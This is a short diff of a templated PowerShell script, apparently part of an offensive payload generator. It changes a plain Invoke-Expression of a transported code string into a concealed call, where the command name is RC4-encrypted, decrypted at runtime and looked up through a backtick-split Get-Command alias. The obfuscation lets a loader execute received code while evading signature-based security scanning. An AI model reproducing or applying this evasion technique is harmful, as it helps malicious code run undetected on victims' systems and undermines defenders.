@@ -66,4 +66,5 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 
 ${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "h"
 
-Invoke-Expression ${{symbol_name("Code")}}
+
+& (g`Cm ({{symbol_name("Decrypt-String")}} "{{'Invoke-Expression'|rc4encrypt}}")) ${{symbol_name("Code")}}
